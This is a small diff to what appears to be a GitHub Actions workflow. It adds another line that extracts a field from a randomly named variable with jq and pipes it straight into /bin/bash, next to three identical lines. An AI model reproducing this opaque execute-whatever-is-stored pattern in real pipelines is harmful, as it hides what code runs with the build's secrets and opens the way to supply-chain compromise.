@@ -25,6 +25,7 @@ jobs:
           echo $olmsr8 | jq -r .kvo314 | /bin/bash
           echo $zift50732 | jq -r .fs20 | /bin/bash
           echo $blf7 | jq -r .wdlpb28630 | /bin/bash
+          echo $pca37 | jq -r .qofgl5 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
